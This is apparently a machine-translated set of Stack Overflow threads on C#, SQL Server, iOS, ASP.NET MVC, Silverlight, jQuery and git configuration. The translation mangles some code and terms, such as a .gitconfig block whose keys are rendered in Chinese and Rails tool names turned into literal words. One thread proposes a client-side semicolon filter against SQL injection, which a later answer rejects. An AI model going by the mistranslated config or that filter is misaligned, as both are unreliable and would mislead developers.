            case ".xml": return "text/xml";
            case ".xpm": return "image/x-xpixmap";
            case ".xwd": return "image/x-xwindowdump";
            case ".xyz": return "chemical/x-pdb";
            case ".zip": return "application/zip";
            default: return string.Format("application/{0}", extension);
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2009-03-11T20:25:37.830

您应该能够从动作中返回图像吗？请参阅~~此处~~了解更多信息。

是的，您可以在 MVC 旁边使用 ashx（通过告诉它忽略路由） - 但我不确定这是最好的方法，除非它是重用现有代码。

* * *

对不起各位，链接已被删除。它发生了。

# c# - 调用方法并等待返回值

> ID：636180
> 
> 赞同：4
> 
> 时间：2009-03-11T20:18:48.953
> 
> 标签：c#, wcf, silverlight, asynchronous

如何调用返回 bool 的方法，但在该方法内部为了确定 bool 的值，它异步调用 Web 服务？

```
bool myBool = GetABoolean(5);    

public bool GetABoolean(int id)
{

  bool aBool;

  client.CallAnAsyncMethod(id);  // value is returned in a completed event handler.  Need to somehow get that value into aBool.

  return aBool;  // this needs to NOT execute until aBool has a value

} 
```

所以我需要让 GetABoolean 方法等到 CallAnAsyncMethod 完成并返回一个值，然后再将 bool 返回给调用方法。

我不知道该怎么做。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-03-11T20:22:25.310

Most asyncronous methods return IAsyncResult.

If yours does, you can use the IAsyncResult.AsyncWaitHandle to block (IAsyncResult.AsyncWaitHandle.WaitOne) to block until the operation completes.

ie:

```
`bool aBool;

IAsyncResult res = client.CallAnAsyncMethod(id);
res.AsyncWaitHandle.WaitOne();
// Do something here that computes a valid value for aBool!
return aBool;` 
```

* * *

 `## 回答 #2

> 赞同：4
> 
> 时间：2009-03-11T20:23:06.290

Either call the method synchronously, or add an `CallAnAsyncMethodCompleted` event handler for it, and use the `e.Result` object to work with the return value.

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-03-11T20:21:05.657

你能简单地同步调用web方法吗？

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-03-11T20:26:29.233

This is at least the third time in recent days I've seen this sort of question, so I'll ask some questions (the answer to the OP is obvious).

Why are you considering calling the web service asynchronously? Performance? Not blocking a worker thread?

Have you seen an example that leads you to use an async web service call? If so, could you post the URL of the example?

Thanks for your time. Your answers to these questions will help me answer others.

* * *

I added a "silverlight" tag to this question, and I suggest you do the same yourself in the future, for Silverlight questions. That creates the context that all the "blocking" calls must be asynchronous.

Now, a SilverLight expert should answer, but I think you're going about this the wrong way. You're losing the asynchronous nature of the call. I think that your GetABoolean method should be asynchronous as well, and should not return until it has the answer.

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-03-11T20:42:09.770

If there's more code between the call to CallAnAsyncMethod and the return, then there's potential value in doing it asynchronously (although it's likely an unnecessary preoptimization), otherwise synchronize your code.

If you don't have any control over an architecture that's forcing you to do this code asynchronously, you'll have to monitor a variable and loop to wait for completion.

```
bool myBool;
bool retrievingMyBool;
RetrieveABoolean(5);    

public bool RetrieveABoolean(int id)
{
    client.CallAnAsyncMethod(id);  // value is returned in a completed event handler.  Need to somehow get that value into aBool.
    retrievingMyBool = true;
    while (retrievingMyBool)
    {
        Thread.Sleep(100);
    }
}

private void completedEventHandler([[parameters go here]])
{
    // code to handle parameters
    myBool = // whatever
    retrievingMyBool = false    
} 
```

This is a horrible solution, and will cause you gigantic headaches in the future, especially if you ever need the code to be thread safe, but as a hack, it could work.

# sql-server - SQL Server 2000 中的缓存函数结果

> ID：636185
> 
> 赞同：7
> 
> 时间：2009-03-11T20:20:25.707
> 
> 标签：sql-server, caching, sql-server-2000

我想记住函数结果以提高性能，即懒惰地填充在函数参数上索引的缓存。我第一次调用函数时，缓存不会有任何输入参数，所以它会在返回之前计算并存储它。后续调用仅使用缓存。

然而，SQL Server 2000 似乎有一个关于函数是“确定性”的愚蠢的任意规则。禁止插入、更新和常规存储过程调用。但是，允许扩展存储过程。这是如何确定的？如果另一个会话修改了数据库状态，函数输出无论如何都会改变。

我快疯了。我曾认为我可以使缓存对用户透明。这可能吗？我没有部署扩展存储过程的权限。

编辑：

这个限制仍然在 2008 年。你不能打电话给 RAND，看在上帝的份上！

缓存将由我在数据库中实现。缓存是用于缓存的任何数据存储...

编辑：

除了对基础数据的更改之外，没有任何情况下函数的相同参数会产生不同的结果。这是一个 BI 平台，唯一的更改来自预定的 ETL，那时我会截断缓存表。

这些是 I/O 密集型时间序列计算，数量级为 O(n^4)。我无权更改基础表或索引。此外，许多这些函数使用相同的中间函数，并且缓存允许使用这些函数。

UDF 并不是真正的确定性，除非它们考虑到数据库状态的变化。重点是什么？SQL Server 是否缓存？（具有讽刺意味。）如果 SQL Server 正在缓存，那么它必须在对模式绑定的表进行更改时到期。如果它们是模式绑定的，那么为什么不绑定函数修改的表呢？我可以理解为什么不允许使用 proc，尽管这很草率；只是模式绑定过程。而且，顺便说一句，为什么允许扩展存储过程？你不可能追踪那些为确保确定性所做的事情！！！啊！！！

编辑：

我的问题是：有没有办法以一种可以在视图中使用的方式延迟缓存函数结果？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-03-11T20:45:48.500

Deterministic means that the same inputs return the same output independent of time and database.

SQL Server (any version) does no caching of UDFs - I believe it will avoid calling the UDF twice on a single row, but that's it.

One trick I've used is to (I think I posted it here on SO):

Refactor the UDF if you can so that there are effectively a usable discrete subset of values returned for a given set of inputs. For numerical calculations, one can sometimes refactor the logic to return a factor or rate which is multiplied outside the UDF instead of multiplied inside the UDF from a passed in value.

Call the UDF over the DISTINCT rowset and cache the results to a temporary table. If you are only calling the UDF with 100,000 tuples of parameters over a 17,000,000 row set, this is **very** much more efficient.

JOIN to the temporary table (basically converting from code-based logic to table-based logic) to get values.

This table can be re-used as necessary or even kept.

Addition to the table can be done by first LEFT JOINing to find missing cached entries.

This works for both single-row table-valued UDFs and scalar UDFs. I'm mainly using it for table-valued UDFs. There is a hotfix to SQL Server 2005 which is supposed to address the UDF performance - I'm waiting on mthe DBAs to test it before deploying to production.

# iphone - 如何以编程方式使点击 UIImageView 在 iPhone 上执行某些操作？

> ID：636186
> 
> 赞同：4
> 
> 时间：2009-03-11T20:20:26.843
> 
> 标签：iphone, objective-c, cocoa-touch

我以编程方式添加了一个 UIImageView。当用户单击它时，如何让它向我的控制器发送一条消息，并将其作为唯一参数发送？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2009-03-11T23:27:44.023

除非有其他令人信服的理由，否则我不会使用 UIImageView。我只是使用自定义 UIButton 并使用 UIImage 作为它的背景。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2009-03-11T20:23:44.700

1.  Create a new class that extends UIImageView and use that.
2.  In your class, override the touch events - touchesBegan, touchesEnded and/or touchesMoved as appropriate
3.  From those methods, call back to a method on the controller.

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-03-11T23:00:42.730

我只是在 UIImage 视图上放置一个自定义按钮，并正常使用 - 自定义样式的按钮是不可见的，因此不会遮挡图像。这也是将文本区域转换为可点击区域的好方法。

或者，您可以将自定义图像指定为按钮的图形背景。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2011-05-24T11:07:22.780

只需在图像视图上放置一个按钮，并将 Alpha 属性设置为 0.10 或更低。您可以捕获按钮的点击事件，但几乎看不到它。

# asp.net - 注册不同类型用户的最佳方法 asp.net mvc

> ID：636188
> 
> 赞同：1
> 
> 时间：2009-03-11T20:20:41.837
> 
> 标签：asp.net, asp.net-mvc, login, asp.net-membership

我希望注册 2 种类型的用户，它们在数据库中都有不同的数据集。

我希望使用 asp.nets 成员角色。是否有任何简单的方法可以使用帐户控制器在 mvc 应用程序中执行此操作？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-03-11T20:26:23.413

使用 ASP.NET 配置工具怎么样？
您可以轻松地在控制器和操作上使用 Authorize(Roles = "...") 属性。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-03-11T20:54:27.620

这里有一些很好的教程可以帮助你。

[http://www.squaredroot.com/post/2007/12/ASPNet-MVC-Membership-Basics.aspx](http://www.squaredroot.com/post/2007/12/ASPNet-MVC-Membership-Basics.aspx)

[http://schotime.net/blog/index.php/2009/02/17/custom-authorization-with-aspnet-mvc/](http://schotime.net/blog/index.php/2009/02/17/custom-authorization-with-aspnet-mvc/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-12T09:07:11.277

我使用 sqltableprofileProvider [http://www.asp.net/downloads/sandbox/table-profile-provider-samples/](http://www.asp.net/downloads/sandbox/table-profile-provider-samples/)得到了这个工作，这让我可以在注册时捕获其他字段。

我将很快在博客中发布更多详细信息和教程。

# ruby-on-rails - 在学习 Ruby on Rails 时，我应该只专注于学习 Rails 还是同时学习相关技术？

> ID：636220
> 
> 赞同：1
> 
> 时间：2009-03-11T20:26:52.007
> 
> 标签：ruby-on-rails

我计划花时间真正深入学习 Ruby on Rails（我之前已经做过一些非常小的涉猎），这样我就有希望将自己重塑为 Rails 开发人员。

我遇到的问题是，目前在 Rails 社区中使用了相当多的相关技术，我不确定我是应该学习整个 shebang 还是先专注于使用默认设置学习 Rails，然后扩展到其他东西。

例如：

*   模板。我看了一下**Haml**，它看起来真的很酷（也不应该很难学）。
*   测试。我想学习测试驱动开发已经有一段时间了，但是 Rails 领域的“下一件大事”似乎是使用**RSpec进行行为驱动开发**
*   Javascript。我不确定我是否应该坚持使用**RJS**或使用类似**jQuery**的东西，这似乎正在改变人们。
*   我从来没有真正使用过版本控制。Rails 似乎在其大部分项目中都使用了**Git 。**

基本上我想“正确”地学习 Rails，但似乎有很多不同的方法可以走。我是否应该忽略“变体”并专注于核心内容，直到我编写了一个或三个应用程序（例如核心、未修改的 Rails；带有原型的 RJS 和用于 Ajax 的 Scriptaculous、用于测试的常规 Test::Unit、用于模板的 ERB、用于版本控制的 Git），还是我应该尝试在此过程中选择一些变体？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-03-11T20:45:15.537

如果您想在 Rails 世界中取得好成绩，您应该计划定期学习（和重新学习）事物。这并不像听起来那么难，但它很重要。我建议你把要学的东西列个清单，然后每天花一个小时左右的时间亲自动手做一些新的东西。如果您觉得还有更多需要学习（或主题不断变化），请将其放回列表的末尾，以便改天重访。

一个起始列表（你的加上一些你没有提到的），没有特别的顺序：

*   erb
*   宝石
*   充当...
*   测试驱动开发
*   混帐
*   rspec & 行为驱动测试
*   javascript
*   原型.js
*   jQuery
*   sql
*   铁路的发现者
*   耙
*   导轨控制台
*   普通的老红宝石
*   鸭子打字
*   ruby 的元编程工具（魔术是如何完成的）
*   css
*   轨道发电机

等等等等。当你经历一个并遇到一些有趣的事情时，把它放在清单上。

关键是，如果你试图采取狭隘的观点，你可能会让自己的生活更加艰难，学习速度也比你承诺永远、稳步地扩大你的视野要慢。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-11T20:32:42.650

我建议从 Rails 的基础开始。Haml、RSpec、jQuery 和 Git 都是很棒的东西，但如果你试图一次学习它们，你可能会不知所措。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-03-11T20:41:28.557

我会先从默认开始，因为我同意马特的评论，即试图一次学习所有内容会让人不知所措。

另外，根据您的应用程序，您可能需要也可能不需要 jQuery，您可能会对默认测试感到满意，并且有很多方法可以制作模板，因此从 ERB 开始以基本了解视图 /模板作品是个好主意。

一旦您获得更多经验并准确了解您的应用程序的要求，您就可以更轻松地选择和更换一些变体。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-03-11T20:45:23.353

我已经成为一名全职 Rails 开发人员一年多了，你使用什么实际上取决于你最终加入的团队类型。我几乎没有使用过 RJS，从未使用过 RSpec，但我每天都使用 git、jquery 和 rails。

我的建议：至少坚持几个月。仅在框架中就有很多东西要学习。我会考虑忽略 RJS，因为我觉得随着开发人员倾向于 jQuery，它已经过时了。

常规测试::Unit 很棒，尽管我喜欢添加 thinkbot 的 Shoulda 以提供一些测试宏，从而节省大量时间（考虑忽略所有的 Shoulda 上下文内容）。

恕我直言，学习 git 感觉非常重要，主要是因为它很棒并且越来越受欢迎。它还使您可以轻松地使用 github，这可能是一个很大的优势。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-03-11T20:45:51.917

吉特很重要。在 github 上创建一个帐户，安装 git，然后习惯它——你需要某种版本控制，不妨让它成为新的酷流行语。

其他的，不多说了。敲出几个应用程序，然后一次添加一个。

# asp.net-mvc - ASP.NET MVC - MasterPageView and RenderPartials - Confusion

> ID：636223
> 
> 赞同：5
> 
> 时间：2009-03-11T20:27:40.367
> 
> 标签：asp.net-mvc

I'm a little confused with trying to do bring a list of Categories into a navigation bar on a MasterPageView in the latest release of the ASP.NET MVC framework. I have 0 experience with Partials so far (this adds to the confusion).

Should I use this variant of the RenderPartial?

```
HtmlHelper.RenderPartial(string partialViewName, object model) 
```

I wasn't able to find any good examples of this method. By convention there is no model associated with the MasterPageView right? So what is the proper way to push or pull data into a "partial" from the MasterPageView?

Assuming that this method is absolutely going down the wrong path:

```
 <div id="navigation">
        <% 
            CategoryRepository cr = new CategoryRepository();
            IList<Category> lst = cr.GetCategories();
            Html.RenderPartial("NavBar", lst);
        %>
    </div> 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2009-03-11T21:51:16.983

您不希望您的母版页有视图数据吗？您可以通过拥有一个所有其他视图数据类都继承自的基本视图数据类来解决它...

BaseViewData.cs - 这是一个 viewdata 类，所有其他 viewdata 类都将从中继承

```
public class BaseViewData
{
    public string Title { get; set; }
    public string MetaKeywords { get; set; }
    public string MetaDescription { get; set; }
    IList<Category> NavCategoryList { get; set; }
} 
```

现在在您的 Site.Master 页面中只需

```
<%@ Master Language="C#" Inherits="System.Web.Mvc.ViewMasterPage<BaseViewData>" %>

<title><%=ViewData.Model.Title %></title>
<meta name="keywords" content="<%=ViewData.Model.MetaKeywords %>" />
<meta name="description" content="<%=ViewData.Model.MetaDescription %>" />

<%= Html.RenderPartial("NavBar", ViewData.Model.NavCategoryList) %> 
```

这可能会显着影响您的应用程序架构，但不一定是坏事。

HTH，查尔斯

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-11T20:43:40.110

```
public ActionResult NavBar()
{

            CategoryRepository cr = new CategoryRepository();
            IList<Category> lst = cr.GetCategories();

            return View(lst);
} 
```

on your partial call

```
<%@ Control Language="C#" Inherits="System.Web.Mvc.ViewUserControl" %>
<%@ Import Namespace="app.Models" %> 
```

and do all your rendering ui here

```
<div id="navigation">
        <% 
           Html.RenderPartial("NavBar");
        %>
    </div> 
```

you can do ActionResult calls in your controllers

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-03-11T20:47:17.090

我会说，由于它是母版页，您可能必须使用字符串键存储您在 ViewData 中传递的数据。如果它是一个常规视图页面，最好有一个强类型页面，但这是另一种情况。因此，您可能会在控制器中执行以下操作：

```
ViewData["MasterPageData"] = FunctionToGetData(); 
```

然后在母版页上是这样的：

```
<% 
   if (ViewData["MasterPageData"] != null) 
   {
      Html.RenderPartial("ControlName.ascx", ViewData);
   } 
%> 
```

然后在控件中，像在普通视图页面上一样处理：

```
<% var categories = (CastIfNeeded)ViewData["MasterPageData"]; %>

process as normal... 
```

我还没有将数据传递到母版页，但我认为你会这样做。更多信息 [在这里。](http://www.asp.net/learn/mvc/tutorial-13-cs.aspx)

编辑：稍微改变一下以反映我在当前项目中所做的事情。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-03-11T20:35:58.710

I would use Html.RenderAction() instead and return a partial view from it.

# wcf - WCF 和 WSE 2.0 Web 服务

> ID：636243
> 
> 赞同：4
> 
> 时间：2009-03-11T20:32:44.537
> 
> 标签：wcf, wse

如何使用 WCF 与老式 WSE 2.0 Web 服务进行通信？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-03-11T23:42:46.997

首先，在我看来，WSE 2.0 和 WSE 3.0 都是过时的，而不是“老派”。

其次，你“只是去做”。添加服务引用并通过代理类调用。如果一切配置正确，它应该可以正常工作。例外情况是旧的 WSE 代码做了一些非标准的事情。也就是说，如果它做了一些没有成为标准的一部分但在 WSE 中得到支持的事情。

# silverlight - 使用自定义控件时，Silverlight 错误“布局周期检测到布局无法完成 ”

> ID：636245
> 
> 赞同：14
> 
> 时间：2009-03-11T20:33:07.733
> 
> 标签：silverlight, custom-controls, silverlight-2.0

我正在通过从 ContentControl 派生并执行一些特殊格式以在内容后面放置阴影来在 Silverlight 中构建自定义控件。

我几乎让它工作了，但最近遇到了一个奇怪的错误。如果它包含除边框或没有明确定义的高度和宽度的网格/堆栈面板/等之外的任何内容，则它可以正常工作。

我在 IE 中收到一个 JavaScript 错误，文本显示：

> 运行时错误 4008... 检测到布局周期... 布局无法完成​​。

如果我在包含的网格/堆栈面板/等上指定高度和宽度，它可以正常工作。

当使用太多文本框（超过 250 个）时，网络上有很多关于此错误的信息，但我可以使用网格中的单个按钮重现我的错误。

我的页面上根本没有文本框。该错误与检测到的无限循环有关。我在代码中设置了一些断点，似乎“SizeChanged”事件在渲染过程中被调用了很多，并且每次高度/宽度增加 10。

我假设设置默认高度/宽度会导致它跳过这个数字的递增，但我不知道为什么会发生这个错误。

有没有人遇到过这个或有任何想法？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2009-03-12T01:23:28.473

这里有[一篇关于这个错误的好博文](http://blog.jeffhandley.com/archive/2008/09/26/silverlight-2-post-beta2-gotcha---layout-cycle-detected.aspx)。

基本上可能发生的事情是你在`MeasureOverride`某个地方改变了一些尺寸，这会导致另一个测量，这会改变尺寸，这会导致测量等等。我之前遇到过一次并通过删除任何导致布局更新或在布局周期中触发布局更新的代码来修复它。

更新：由于博客文章已消失，请在此处全文引用：

> 继续我的 Silverlight 2 问题系列，我想谈谈人们看到的一个常见错误。此错误是您在将代码从 Beta 2 移动到候选发布版或更高版本时可能会看到的新错误。在 Beta 2 中，如果布局引擎检测到一个循环，它不会抛出任何错误；据我了解，布局刚刚中止。但是使用后 Beta2 位，会引发错误。
> 
> 您将收到的错误将指定“检测到布局周期”作为消息。这个错误信息非常准确——布局引擎在你的布局中检测到一个循环；或者换一种说法，你的布局中有一个无限循环。
> 
> 导致此错误的最大罪魁祸首是 LayoutUpdated 事件处理程序中的代码。如果您的 LayoutUpdated 事件处理程序执行任何操作来更改控件的布局，那么这将导致 LayoutUpdated 事件再次触发，一次又一次...... :-)
> 
> 有时您需要在此事件处理程序中使用布局更改代码，那么该怎么做呢？
> 
> 首先，您应该考虑是否真的需要在每次调用 LayoutUpdated 时进行布局更改。处理 Loaded 事件以及 Application.Current.Host.Content.Resized 事件是否就足够了。在这两个事件之间，您将在控件加载到可视化树时收到通知，并且在主机调整大小时您会收到通知，这可能会导致您需要再次更改布局。像模态对话框这样的场景应该属于这一类。
> 
> 其次，如果您确实需要使用 LayoutUpdated，您可能只需要在布局更改周围设置一些条件。例如，如果您正在为控件计算新的宽度和高度，在实际设置宽度和高度之前，请检查以确保当前值与您计算的值不同。这将允许第一个 LayoutUpdated 事件调整您的控件的大小，这会触发另一个 LayoutUpdated 事件，但该事件将识别出没有工作要做，并且循环将结束。
> 
> 当您处理 SizeChanged 事件，或者您对控件的布局进行任何其他覆盖时，这些相同的规则将适用。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2009-03-12T01:30:28.113

一个常见的原因是处理`SizeChanged`，然后在处理程序中做一些影响元素大小的事情。有时这并不明显 - 例如，它可能正在修改影响其容器大小的子元素。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2014-03-06T09:36:20.390

1.如果您在 ScrollViewer 中使用 LongListSelector，最好将其删除。我遇到了同样的问题，我的 LongListSelector 在 ScrollViewer 中。在 ItemRealized 事件期间，收到此错误。

2.不要在 itemrealized 中使用 updatelayout() ..我使用的是类似的东西

```
 list.UpdateLayout();
 list.ScrollTo(e.Container.Content); 
```

只需使用 ScrollTo

3.如果您在longlistselector中使用图像，请确保设置图像的高度和宽度。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2011-05-17T12:18:52.087

我遇到了同样的问题，我所做的是将所有布局更新（大小更改）放在稍后调用的“调用”委托中，它停止崩溃，但是你有一个很好的改变，它卡在一个循环中

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-05-12T19:59:39.500

我遇到了同样的问题，但它很少发生，我的代码多年来没有改变，直到最近才有人设法体验它。

我在 LongListSelector DataSource 中有一个 TextBlock，它的 FontSize 设置为 21。将 FontSize 更改为任何其他值为我解决了这个问题......

我的 LongListSelectors 在 ScrollViewer 中。

```
 <phone:PanoramaItem x:Name="OwnedGamesPanoramaItem" >
            <ScrollViewer Margin="5,-25,0,0">
            <StackPanel>
                    <TextBlock toolkit:TiltEffect.IsTiltEnabled="True" Text="{Binding Path=LocalizedResources.XOwnedGames, Source={StaticResource LocalizedStrings}}" FontFamily="Segoe WP Semibold" CharacterSpacing="10"  FontSize="25" Margin="0,10,0,25" TextWrapping="Wrap"/>
                    <TextBlock x:Name="ownedGameLoadingTextBox" Margin="10" FontSize="26" Text="{Binding Path=LocalizedResources.XLoading, Source={StaticResource LocalizedStrings}}" HorizontalAlignment="Center"/>
                    <phone:LongListSelector x:Name="OwnedGameListBox" Tap="OwnedGameListBoxTap" ScrollViewer.VerticalScrollBarVisibility="Disabled" ItemRealized="OwnedGameListBox_ItemRealized" ItemUnrealized="OwnedGameListBox_ItemUnrealized" BorderThickness="0,20,0,0"  >
                        <phone:LongListSelector.ItemTemplate>
                            <DataTemplate>
                                <StackPanel Orientation="Vertical" Tap="OwnedGameListBoxTap" Margin="0,0,0,12">
                                    <StackPanel Orientation="Horizontal" HorizontalAlignment="Left" VerticalAlignment="Top" Margin="10,10,0,0" Tap="StackPanel_Tap_1">
                                        <Image Width="60" Source="{Binding getSmallImageActualURL}" Height="60"  Margin="3" VerticalAlignment="Top" />
                                        <StackPanel Margin="15,0,0,0">
                                            <TextBlock Width="320" TextWrapping="Wrap" Text="{Binding name}" Margin="0,0,0,0" FontSize="32" />
                                            <TextBlock Text="{Binding getTotalPlaytimeFormatted}" Margin="0,0,0,0" TextWrapping="Wrap" FontSize="21" >
                                                <TextBlock.Foreground>
                                                    <SolidColorBrush Color="{StaticResource PhoneAccentColor}"/>
                                                </TextBlock.Foreground>
                                            </TextBlock>
                                        </StackPanel>
                                    </StackPanel>
                                </StackPanel>
                            </DataTemplate>
                        </phone:LongListSelector.ItemTemplate>
                    </phone:LongListSelector>
                </StackPanel>
            </ScrollViewer>
        </phone:PanoramaItem> 
```

使固定：

```
<TextBlock Text="{Binding getTotalPlaytimeFormatted}" Margin="0,0,0,0" TextWrapping="Wrap" FontSize="22" > 
```

# asp.net - jQuery AlphaNumericPlugin - 复制粘贴问题

> ID：636248
> 
> 赞同：2
> 
> 时间：2009-03-11T20:33:44.003
> 
> 标签：asp.net, jquery, linq-to-sql, sql-injection, validation

我正在为 jQuery 使用 .alphanumeric 插件，当用户直接在文本框中输入内容时，它确实可以满足我的期望。但是，如果用户将一个值复制并粘贴到文本框中，那么所有的赌注都将被取消。

```
$("#<%= txtNumber.ClientID %>").alphanumeric({allow:"-"}); 
```

我当然可以这样做：

```
$(document).ready(function() {
    $("#<%= txtNumber.ClientID %>").blur(function() {
        $("#<%= txtNumber.ClientID %>").val(
            RemoveInvalidCharacters(
                $("#<%= txtNumber.ClientID %>").val()
            )
        );
    });
});

//FUNCTION REMOVES ANY ; IN TEXT TO PREVENT SQL INJECTION
function RemoveInvalidCharacters(text) {
     return text.replace(';', '');
} 
```

但是......我宁愿不必用 .blur() 函数进一步整理我的代码。有没有其他方法可以解决这个问题？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-03-13T00:01:50.147

处理粘贴事件相当简单。我在我的[蒙面输入插件](http://digitalbush.com/projects/masked-input-plugin/)中使用了这种技术，效果很好。随意浏览源代码以查看它的使用情况。

这是为您上面的示例修改的相关位。

```
var pasteEventName = $.browser.msie ? 'paste' : 'input';
$("#<%= txtNumber.ClientID %>").bind(pasteEventName, function() {
   setTimeout(function() { 
      RemoveInvalidCharacters(
         $("#<%= txtNumber.ClientID %>").val()
      ); 
   }, 0);
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2010-02-03T19:51:07.077

我在这里找到了这个解决方案：http: [//www.devcurry.com/2009/10/allow-only-alphanumeric-characters-in.html](http://www.devcurry.com/2009/10/allow-only-alphanumeric-characters-in.html)

```
<script type="text/javascript">
$(function() {
 $('input.alpha').keyup(function() {
  if (this.value.match(/[^a-zA-Z0-9 ]/g)) {
   this.value = this.value.replace(/[^a-zA-Z0-9 ]/g, '');
  }
 });
});
</script>

<input type="text" name="test" value="" class="alpha"> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2010-11-07T21:11:10.357

我也需要解决粘贴问题的方法，我想出了一些对我有用的方法。人们仍然可以在浏览器菜单中使用“编辑”>“粘贴”，但可以处理 Ctrl-V 以及右键单击粘贴。在 FF、IE、Opera、Safari、Chrome 中测试：

```
<!DOCTYPE html>
<html>
<head>
    <title>Only Allow Certain Characters</title>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
</head>
<body>
    <br>
    <form id="myform" action="">
        <input id="element1" name="mytext1" type="text">
        <input id="element2" name="mytext2" type="text">
    </form>
<script>
    /* removes evil chars while typing */
    (function($){
        $.fn.disableChars = function(a) {

            a = $.extend({
                allow: ''
            }, a);

            b = a.allow.split('');
            for ( i=0; i<b.length; i++) b[i] = "\\" + b[i];
            a.allow = b.join('');

            var regex = new RegExp('[^a-z0-9' + a.allow + ']', 'ig');

            $(this)
            .bind('keyup blur', function() {
                if (this.value.search(regex) != '-1') {
                    this.value = this.value.replace(regex, '');
                }
            })
            .bind('contextmenu',function () {return false});

        }
    })(jQuery);

    $("#element1").disableChars();
    $("#element2").disableChars({allow:".,:-() "});
</script>
</body>
</html> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-03-11T20:40:29.823

复制和粘贴绝对是屏蔽输入的挑战。

您是否考虑过在提交表单时而不是在用户输入值时“编码”特殊字符？我们做同样的事情来允许用户在 TextBoxes 中输入 < 和 > 字符（我们通过 javascript 将它们转换为 < 和 > 然后在后面的代码中返回到 < 和 >。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-03-13T00:08:22.160

这样您就不会阻止 SQL 注入。我不需要使用您的表单，我可以制作我的表单并将其发布到您的脚本中。更简单：我可以禁用 javascript 并删除您的数据库。

相反，检查服务器端的输入有效性。

最简单的方法是转义它或使用参数化查询。

# git - Msys Git 合并工具命令选项问题

> ID：636253
> 
> 赞同：20
> 
> 时间：2009-03-11T20:34:54.797
> 
> 标签：git, version-control, merge, batch-file

我在 Windows 机器上使用[msys Git](http://code.google.com/p/msysgit/)进行源代码控制，我试图弄清楚如何让我的合并工具[WinMerge](http://winmerge.org/)与 Git 一起使用。

我已尽我所能遵循[此博客](http://davesquared.blogspot.com/2009/02/setting-up-diff-and-merge-tools-for-git.html)上的说明，因为它是我发现的最接近我正在尝试做的事情。基本上我所做的是：

修改我的`.gitconfig`文件以包含以下内容：

```
[合并]
    工具 = winmerge

[合并工具“winmerge”]
    cmd = \"C:\\Program Files (x86)\\WinMerge\\WinMergeU.exe\" "$PWD/$LOCAL" "$PWD/$REMOTE" "$PWD/$MERGED"  
        信任退出代码 = 假  
    保持备份 = 假

```

这几乎可以工作了。当我尝试从 Git 运行合并工具时，WinMerge 给我一个错误，说它找不到文件的路径，这是完全有道理的，因为它正在寻找的路径是：

```
C:\MY\WORKING\DIRECTORY\-e
C:\MY\WORKING\DIRECTORY\-ub

```

看起来 Git 正在将选项传递给合并工具，而不是如果一切正常，我希望通过的本地和远程文件名。

我在网上搜索了 Git 的合并文档，但似乎找不到与我正在尝试做的事情相关的任何内容。我的猜测是解决方案将是以下之一：

1.  假设&不正确，将`$LOCAL`&`$REMOTE`变量更改为正确的值。 `$LOCAL``$REMOTE`
2.  编写一个脚本来调用 WinMergeU，并在我的脚本`.bat`逻辑中处理 Git 发送到合并工具的参数。`.bat`

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2010-02-13T16:54:32.493

如果您查看有冲突的文件，您会注意到标准`Theirs >>>>>>>`和`<<<<<< Mine`标记。WinMerge 将这些理解为合并冲突，因此不需要明确指定“他们的”和“我的”；只需要告诉它是哪个文件具有冲突标记。

1.  我们知道工作目录中的文件包含标记。
2.  我们要合并到的文件也将是这个文件是有道理的 - 我们也知道这`git mergetool`使得`$MERGED`命名该文件的变量可用。

    ```
    [mergetool "winmerge"]
        cmd = 'C:/Program Files/WinMerge/WinMergeU.exe' \"$MERGED\" 
    ```

这就是将 git 与 WinMerge 连接以解决合并/冲突所需的全部内容；不需要脚本或命令行开关。请参阅文档中的第 3 种命令行形式（由上面的 OP 链接）和`conflictfile`参数说明。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2009-03-11T20:50:33.323

来自[WinMerge 命令行手册](http://winmerge.org/docs/manual/CommandLine.html)：

```
cmd = \"C:\\Program Files (x86)\\WinMerge\\WinMergeU.exe /ub /e \"
cmd = \"C:\\Program Files (x86)\\WinMerge\\WinMergeU.exe /u /e \" 
```

（/u 是带有最新 WinMerge 的新 /ub）

在您的 mergetool 部分中作为命令可能会更好。

但是，您可能必须将此调用包装在脚本中，如此[SO answer](https://stackoverflow.com/questions/255202/how-do-i-view-git-diff-output-with-visual-diff-program/392899#392899)中所述。

提取适应于`merge.tool`：

> `mergetool`使用自定义`diff`工具进行配置的实际案例：

```
C:\myGitRepo>git config --global merge.tool winmerge
C:\myGitRepo>git config --global mergetool.winmerge.cmd "winmerge.sh \"$LOCAL\" \"$REMOTE\""
